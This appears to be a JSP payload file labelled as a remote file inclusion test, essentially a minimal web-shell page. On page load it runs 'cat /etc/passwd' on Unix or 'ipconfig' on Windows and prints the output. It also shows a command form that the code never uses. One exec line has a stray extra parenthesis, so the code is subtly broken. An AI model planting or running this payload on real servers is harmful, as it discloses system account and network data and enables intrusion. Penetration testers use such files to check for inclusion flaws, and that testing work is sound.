<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
.jsp RFI payload test.
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
	Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C ipconfig"));
    }
    else{
        p = Runtime.getRuntime().exec("cat /etc/passwd");
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }

%>
</pre>
</BODY></HTML>
